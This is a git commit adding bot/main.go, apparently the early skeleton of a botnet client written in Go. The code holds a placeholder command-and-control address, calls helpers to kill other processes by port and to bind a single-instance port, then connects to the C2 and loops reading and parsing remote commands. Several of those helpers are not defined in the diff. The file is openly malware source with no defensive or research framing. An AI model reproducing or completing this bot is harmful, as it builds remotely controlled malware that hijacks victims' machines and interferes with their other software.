02c50d6482b0568e21cf7b009918953c35082291
Ѵιcнч <66045929+Its-Vichy@users.noreply.github.com>
2021-11-25 17:51:35 +0100

    🌶️ Port killer

---
+++ bot/main.go
@@ -0,0 +1,40 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"strings"
+)
+
+var (
+	cnc_addr             = "https://raw_ip_of_cnc.domain"
+	debug_mode           = true
+	single_instance_port = 13370
+)
+
+func debug(content string) {
+	if debug_mode {
+		fmt.Printf("[DEBUG] %s\n", content)
+	}
+}
+
+func main() {
+	kill_all_by_port()
+	bind_instance_port()
+  
+	socket := init_socket()
+
+	for {
+		data, err := bufio.NewReader(socket).ReadString('\n')
+
+		if err != nil {
+			debug(fmt.Sprintf("Error when read buffer: %s", err))
+			break
+		}
+
+		data = strings.Split(data, "\n")[0]
+		args := strings.Split(data, " ")
+
+		debug(fmt.Sprintf("Recieved command: %s | args: %d", data, len(args)))
+	}
+}
